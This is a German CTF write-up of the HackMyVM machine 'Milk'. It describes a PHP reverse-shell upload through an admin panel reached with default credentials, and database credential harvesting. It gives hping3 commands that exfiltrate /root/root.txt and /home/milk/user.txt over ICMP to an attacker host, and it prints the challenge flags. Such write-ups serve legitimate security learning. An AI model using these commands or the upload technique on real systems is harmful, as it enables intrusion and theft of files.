# Milk - HackMyVM (Medium)

![Milk.png](Milk.png)

## Übersicht

*   **VM:** Milk
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Milk)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 23. November 2020
*   **Original-Writeup:** https://alientec1908.github.io/Milk_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, die User- und Root-Flags der Maschine "Milk" zu erlangen. Der initiale Zugriff erfolgte durch das Ausnutzen einer unsicheren Dateiupload-Funktion im Admin-Panel einer Webanwendung. Die Admin-Credentials (`admin:admin`) wurden durch Analyse eines Datenbank-Dumps (`fos_db.sql`) bestätigt, der im Web-Root gefunden wurde. Nach dem Hochladen einer PHP-Reverse-Shell wurde Zugriff als Benutzer `www-data` erlangt. Die Flags wurden anschließend mittels `hping3` über ICMP-Pakete exfiltriert, was Lesezugriff auf die Flag-Dateien durch den `www-data`-Benutzer (oder einen eskalierten Benutzer) impliziert, obwohl der genaue Eskalationspfad zu Root im Bericht nicht detailliert wurde.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `vi` / `nano`
*   Burp Suite (impliziert für File Upload)
*   `nc` (netcat)
*   `cat`
*   `ss`
*   `mysql`
*   `hping3`
*   Standard Linux-Befehle (`ls`, `cd`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Milk" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.146) mit `arp-scan` identifiziert.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 7.9p1) und Port 80 (HTTP, Nginx 1.14.2).
    *   `gobuster` auf Port 80 fand diverse PHP-Dateien (`index.php`, `login.php`, `contact-us.php`, etc.) und das Verzeichnis `/admin/`. Auf der Kontaktseite wurde die E-Mail `john@gmail.com` gefunden.
    *   Ein weiterer `gobuster`-Scan auf `/admin/` enthüllte typische Admin-Panel-Dateien.

2.  **Initial Access (via File Upload RCE als `www-data`):**
    *   Es wurde angenommen (und später durch Datenbankanalyse bestätigt), dass der Admin-Login mit Standard-Credentials (`admin:admin`) funktioniert.
    *   Nach dem Login ins Admin-Panel wurde eine Funktion zum Verwalten von Fahrzeugen ("Manage Vehicles") gefunden, die einen Dateiupload erlaubte.
    *   Mittels Burp Suite wurde ein legitimer Upload-Request abgefangen, der Dateiname zu `rev.php` geändert und der Inhalt durch eine PHP-Reverse-Shell ersetzt.
    *   Nach erfolgreichem Upload und Aufruf der Datei (z.B. durch Klicken auf das hochgeladene "Bild") wurde eine Reverse Shell als `www-data` zu einem Netcat-Listener aufgebaut.

3.  **Post-Exploitation & Database Enumeration:**
    *   Als `www-data` wurde die Datei `includes/config.php` (eingebunden von `update-password.php`) untersucht, die vermutlich Datenbank-Credentials enthielt.
    *   `ss -tulpe` zeigte einen lokal lauschenden MySQL-Dienst (127.0.0.1:3306).
    *   Mit den Credentials `root:p4ssw` (aus `config.php`) wurde auf die MariaDB-Datenbank zugegriffen.
    *   In der Datenbank `car` wurde die Tabelle `admin` gefunden, die den Hash `21232f297a57a5a743894a0e4a801fc3` (MD5 für "admin") für den Benutzer `admin` enthielt. Die Tabelle `tblusers` enthielt den Benutzer `ben` mit dem MD5-Hash `91d609dc84162abf5e69cd5d7ef07145`.
    *   *Der Bericht geht nicht auf das Knacken des `ben`-Hashes oder weitere traditionelle Privilegieneskalation ein.*

4.  **Data Exfiltration (Flags mittels `hping3`):**
    *   Es wird angenommen, dass der Angreifer (als `www-data` oder nach einer nicht gezeigten Eskalation) Lesezugriff auf die User- und Root-Flag-Dateien hatte.
    *   Auf dem Angreifer-System wurde ein `hping3`-Listener gestartet: `hping3 --listen ANGRIFFS_IP -I eth0 --sign MSGID1`.
    *   Auf dem Zielsystem wurde `hping3` verwendet, um den Inhalt der Flag-Dateien über ICMP-Pakete zu exfiltrieren:
        *   `hping3 ANGRIFFS_IP --icmp --sign MSGID1 -d 1000 -c 1 --file /root/root.txt`
        *   `hping3 ANGRIFFS_IP --icmp --sign MSGID1 -d 1000 -c 1 --file /home/milk/user.txt`
    *   Die Flags wurden erfolgreich auf dem Listener des Angreifers empfangen.
    *   User-Flag (`/home/milk/user.txt`): `uzerhmvflag`.
    *   Root-Flag (`/root/root.txt`): `icmpismyfriend`.

## Wichtige Schwachstellen und Konzepte

*   **Unsichere Dateiupload-Funktion:** Eine Webanwendung erlaubte das Hochladen von PHP-Dateien ohne ausreichende Validierung, was zu Remote Code Execution (RCE) führte.
*   **Standard-Admin-Credentials:** Das Admin-Panel war mit den Standard-Zugangsdaten `admin:admin` gesichert.
*   **Exponierte Datenbank-Credentials:** Zugangsdaten für die Datenbank (`root:p4ssw`) waren in einer Konfigurationsdatei im Web-Root gespeichert.
*   **Verwendung schwacher Passwort-Hashes (MD5):** Die Datenbank speicherte Passwörter als MD5-Hashes, die leicht zu knacken sind.
*   **Datenexfiltration über ICMP (`hping3`):** Eine unkonventionelle Methode, um Daten über ICMP-Pakete zu exfiltrieren, falls andere Kanäle blockiert sind und Leserechte auf die Zieldateien bestehen.
*   *(Impliziert)* **Fehlkonfiguration der Dateiberechtigungen:** Der Webserver-Benutzer (`www-data`) oder ein eskalierter Benutzer hatte Lesezugriff auf `/root/root.txt` und `/home/milk/user.txt`.

## Flags

*   **User Flag (`/home/milk/user.txt`):** `uzerhmvflag`
*   **Root Flag (`/root/root.txt`):** `icmpismyfriend`

## Tags

`HackMyVM`, `Milk`, `Medium`, `File Upload RCE`, `Default Credentials`, `Database Leak`, `MD5 Hashes`, `Data Exfiltration`, `hping3`, `ICMP Tunneling`, `Linux`, `Web`, `Privilege Escalation` (impliziert)
